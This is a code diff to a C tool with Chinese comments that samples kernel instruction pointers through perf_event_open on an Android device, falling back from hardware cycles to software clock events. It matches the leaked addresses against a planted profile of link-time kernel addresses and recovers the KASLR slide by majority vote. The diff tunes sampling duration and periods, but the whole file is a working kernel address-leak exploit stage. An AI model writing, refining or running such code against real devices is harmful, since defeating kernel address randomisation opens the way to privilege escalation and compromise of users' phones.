@@ -4,16 +4,16 @@
  * 真机结论（2026-11-22，shell 身份，6.18.21）：
  *   perf_event_open(HARDWARE cycles)  → errno=13 EACCES   SELinux 只挡硬件 PMU
  *   perf_event_open(SOFTWARE)         → errno=7  E2BIG    权限通，只是 attr.size 太大
- * 所以这里：attr.size 用 PERF_ATTR_SIZE_VER5，先试硬件，失败退回软件采样。
+ * 所以：attr.size 用 PERF_ATTR_SIZE_VER5，先试硬件，失败退回软件采样。
+ *
+ * --duration 的单位是**秒**（调用方传 1、2），不是毫秒。外层还有 8 秒 timeout 兜底，
+ * 所以这里再夹一次 1..8，避免被误传成几百秒时把设备拖住。
  *
  * slide 的求法：
- *   内核镜像按 2MB 对齐加载，即 运行时地址 = 链接期地址 + slide，且 slide & 0x1FFFFF == 0。
- *   于是对任意泄漏到的内核 ip：若某个 profile 链接期地址 P 满足
- *   (P & 0x1FFFFF) == (ip & 0x1FFFFF)，则 slide = ip - P。
- *   每个样本给出一票，多样本投票取多数——单个样本会有假匹配，多数投票能收敛。
- *
- * profile 来自 /data/local/tmp/lhasa_profile.txt（App 会先投放），
- * 也可以用 --profile 指定别的路径。
+ *   运行时地址 = 链接期地址 + slide，且 slide & 0x1FFFFF == 0（2MB 对齐）。
+ *   对泄漏到的内核 ip：若 profile 里某个链接期地址 P 满足
+ *   (P & 0x1FFFFF) == (ip & 0x1FFFFF)，则 slide = ip - P（天然 2MB 对齐）。
+ *   每个样本投一票，多数投票收敛；单样本会有假匹配。
  */
 #define _GNU_SOURCE 1
 #include <errno.h>
@@ -32,13 +32,15 @@
 #define SAMPLE_LIMIT   400000
 #define MAX_PROFILE    64
 #define SLIDE_MASK     0x1FFFFFULL
+#define MAX_SECONDS    8
+#define SW_PERIOD_NS   100000ULL
 
 static const char *KERNEL_SYMBOL_VERSION = "LINUX_2.6.39";
 static const char *DEFAULT_PROFILE = "/data/local/tmp/lhasa_profile.txt";
 
 struct config {
 	uint64_t period;
-	uint64_t duration_ms;
+	uint64_t seconds;
 	int quiet;
 	const char *profile;
 };
@@ -64,7 +66,6 @@ static int is_valid_slide(uint64_t slide)
 		&& ((slide + (uint64_t)(-272730423296LL)) >> 48) == 0xFFFF;
 }
 
-/* 从 profile 里收集所有 0x… 形式的链接期地址。 */
 static void load_profile(const char *path)
 {
 	FILE *file = fopen(path, "r");
@@ -105,7 +106,6 @@ static void vote(uint64_t slide)
 	}
 }
 
-/* 用低 21 位匹配 profile 地址；命中则给出 slide 候选。 */
 static void consider_ip(uint64_t ip)
 {
 	uint64_t low = ip & SLIDE_MASK;
@@ -120,7 +120,7 @@ static void consider_ip(uint64_t ip)
 
 static void usage(const char *argv0)
 {
-	printf("usage: %s [--period n] [--duration ms] [--profile path] [--quiet]\n", argv0);
+	printf("usage: %s [--duration seconds] [--period ns] [--profile path] [--quiet]\n", argv0);
 }
 
 static void parse_args(int argc, char **argv, struct config *cfg)
@@ -130,7 +130,7 @@ static void parse_args(int argc, char **argv, struct config *cfg)
 		if (!strcmp(arg, "--period") && i + 1 < argc)
 			cfg->period = strtoull(argv[++i], NULL, 0);
 		else if (!strcmp(arg, "--duration") && i + 1 < argc)
-			cfg->duration_ms = strtoull(argv[++i], NULL, 0);
+			cfg->seconds = strtoull(argv[++i], NULL, 0);
 		else if (!strcmp(arg, "--profile") && i + 1 < argc)
 			cfg->profile = argv[++i];
 		else if (!strcmp(arg, "--quiet"))
@@ -138,14 +138,13 @@ static void parse_args(int argc, char **argv, struct config *cfg)
 		else if (!strcmp(arg, "-h") || !strcmp(arg, "--help"))
 			usage(argv[0]);
 	}
-	if (cfg->duration_ms == 0)
-		cfg->duration_ms = 400;
-	if (cfg->period == 0)
-		cfg->period = 1000;
+	if (cfg->seconds == 0)
+		cfg->seconds = 1;
+	if (cfg->seconds > MAX_SECONDS)
+		cfg->seconds = MAX_SECONDS;
 }
 
-/* 采样一段时间，返回 0 表示成功。 */
-static int sample(uint32_t type, uint64_t config, struct config *cfg,
+static int sample(uint32_t type, uint64_t config, uint64_t period_ns, struct config *cfg,
                   int *samples_out, int *kernel_frames_out)
 {
 	struct perf_event_attr attr;
@@ -153,7 +152,7 @@ static int sample(uint32_t type, uint64_t config, struct config *cfg,
 	attr.type = type;
 	attr.size = PERF_ATTR_SIZE_VER5;
 	attr.config = config;
-	attr.sample_period = cfg->period;
+	attr.sample_period = period_ns;
 	attr.sample_type = PERF_SAMPLE_IP;
 	attr.disabled = 1;
 	attr.exclude_user = 1;
@@ -175,7 +174,7 @@ static int sample(uint32_t type, uint64_t config, struct config *cfg,
 
 	ioctl(fd, PERF_EVENT_IOC_RESET, 0);
 	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-	usleep((useconds_t)(cfg->duration_ms * 1000));
+	usleep((useconds_t)(cfg->seconds * 1000ULL * 1000ULL));
 	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
 
 	struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)ring;
@@ -218,7 +217,7 @@ int main(int argc, char **argv)
 {
 	struct config cfg = {
 		.period = 0,
-		.duration_ms = 0,
+		.seconds = 0,
 		.quiet = 0,
 		.profile = DEFAULT_PROFILE,
 	};
@@ -230,17 +229,20 @@ int main(int argc, char **argv)
 		printf("提示：符号表版本标记 %s\n", KERNEL_SYMBOL_VERSION);
 		return 1;
 	}
+	printf("[perf] 采样 %llu 秒 · profile 地址 %d 条\n",
+	       (unsigned long long)cfg.seconds, g_profile_count);
 
 	int samples = 0, kernel_frames = 0;
-	int hw_err = sample(PERF_TYPE_HARDWARE, PERF_COUNT_HW_CPU_CYCLES, &cfg,
+	uint64_t hw_period = cfg.period ? cfg.period : 1000;
+	int hw_err = sample(PERF_TYPE_HARDWARE, PERF_COUNT_HW_CPU_CYCLES, hw_period, &cfg,
 	                    &samples, &kernel_frames);
 	if (hw_err == 0) {
 		printf("[perf] 采样方式：hardware cycles\n");
 	} else {
 		printf("[perf] hardware cycles open failed errno=%d (%s)\n",
 		       -hw_err, strerror(-hw_err));
-		/* 软件事件在 shell 身份下允许（硬件 PMU 被 SELinux 挡），换它对采样 */
-		int sw_err = sample(PERF_TYPE_SOFTWARE, PERF_COUNT_SW_CPU_CLOCK, &cfg,
+		uint64_t sw_period = cfg.period ? cfg.period : SW_PERIOD_NS;
+		int sw_err = sample(PERF_TYPE_SOFTWARE, PERF_COUNT_SW_CPU_CLOCK, sw_period, &cfg,
 		                    &samples, &kernel_frames);
 		if (sw_err != 0) {
 			printf("[perf] no usable hardware PMU errno=%d\n", -sw_err);
